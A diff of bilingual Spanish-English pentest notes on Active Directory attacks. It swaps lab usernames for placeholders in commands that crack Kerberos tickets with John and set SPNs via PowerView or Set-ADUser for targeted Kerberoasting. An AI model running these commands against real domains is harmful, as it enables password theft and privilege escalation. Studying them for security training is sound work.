@@ -32,21 +32,21 @@ Rubeus: ejecutar desde cmd (NO PS)
 
 -Crack ticket with john: 
 
-`john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worstpass.txt C:\AD\Tools\hashes.txt`
+`john.exe --wordlist=C:passwordlist.txt C:\hashes.txt`
 
 **Privilege Escalation - Targeted Kerberoasting - Set SPN**
 
 Vemos si el usuario tiene SPN:
 
-PowerView:  `Get-DomainUser -Identity support1user | select serviceprincipalname`
+PowerView:  `Get-DomainUser -Identity USERNAME | select serviceprincipalname`
 
-AD: `Get-ADUser -Identity support1user -Properties ServicePrincipalName | select ServicePrincipalName`
+AD: `Get-ADUser -Identity USERNAME -Properties ServicePrincipalName | select ServicePrincipalName`
 
 Seteamos SPN para el usuario (solo en el dominio):
 
-PowerView:  `Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspnX'}`
+PowerView:  `Set-DomainObject -Identity USERNAME -Set @{serviceprincipalname='us/myspnX'}`
 
-AD: `Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='us/myspnX'}`
+AD: `Set-ADUser -Identity USERNAME -ServicePrincipalNames @{Add='us/myspnX'}`
 
 kerberoast el usuario y lo crackeas.
 
